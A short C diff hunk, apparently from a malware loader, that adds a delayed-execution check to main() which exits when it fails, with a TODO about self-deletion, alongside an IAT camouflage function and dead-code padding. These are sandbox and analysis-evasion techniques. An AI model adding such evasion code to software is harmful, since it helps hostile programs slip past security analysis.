@@ -49,6 +49,11 @@ void IATCamouflage()
 //main function
 int main(int argc, char* argv[])
 {
+	if (!DelayExecution())
+	{
+		EXITA(-1); //TODO: replace this with self deletion?
+	}
+
 	int counter = 0;
 	counter = (counter + 1) % 3;
 	if (counter > 100)
